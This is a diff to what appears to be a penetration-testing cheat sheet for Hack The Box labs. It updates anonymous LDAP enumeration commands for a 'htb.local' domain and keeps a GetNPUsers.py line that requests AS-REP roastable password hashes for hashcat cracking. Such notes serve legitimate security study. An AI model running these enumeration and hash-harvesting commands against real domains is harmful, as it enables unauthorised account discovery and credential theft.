@@ -119,11 +119,11 @@ Ref: https://www.how2shout.com/linux/mount-virtual-hard-disk-vhd-file-ubuntu-lin
 
 ## LDAP (636)
 ```
-ldapsearch -h [IP_ADDR] -x
-ldapsearch -h [IP_ADDR] -x -s base namingcontexts
-ldapsearch -h [IP_ADDR] -x -b "DC=htb DC=local"
-ldapsearch -h [IP_ADDR] -x -b "DC=htb DC=local" '(objectClass=Person)'
-ldapsearch -h [IP_ADDR] -x -b "DC=htb DC=local" '(objectClass=Person)' sAMAccountName |grep sAMAccountName
+ldapsearch -H ldap://[IP_ADDR] -x
+ldapsearch -H ldap://[IP_ADDR] -x -s base namingcontexts
+ldapsearch -H ldap://[IP_ADDR] -x -b "DC=htb DC=local"
+ldapsearch -H ldap://[IP_ADDR] -x -b "DC=htb DC=local" '(objectClass=Person)'
+ldapsearch -H ldap://[IP_ADDR] -x -b "DC=htb DC=local" '(objectClass=Person)' sAMAccountName |grep sAMAccountName
 python GetNPUsers.py -dc-ip [IP_ADDR] -request 'htb.local/' -format hashcat
 ```
 
